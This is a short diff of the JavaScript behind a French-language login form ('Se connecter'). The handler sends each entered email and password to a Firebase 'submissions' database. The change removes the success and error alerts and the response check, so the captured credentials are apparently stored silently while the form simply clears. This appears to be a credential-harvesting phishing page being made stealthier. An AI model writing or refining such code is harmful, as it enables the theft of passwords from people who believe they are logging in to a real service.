@@ -81,17 +81,16 @@
       };
 
       try {
-        const r = await fetch(`${DB_URL}/submissions.json`, {
+        await fetch(`${DB_URL}/submissions.json`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
         });
-        if (!r.ok) throw new Error("Erreur Firebase");
-        alert("✅ Données envoyées !");
+        // ✅ Pas d'alerte affichée
         emailEl.value = "";
         pwdEl.value = "";
       } catch (err) {
-        alert("❌ Erreur: " + err.message);
+        console.error("Erreur:", err.message);
       } finally {
         submitBtn.textContent = "Se connecter";
         refreshSubmit();
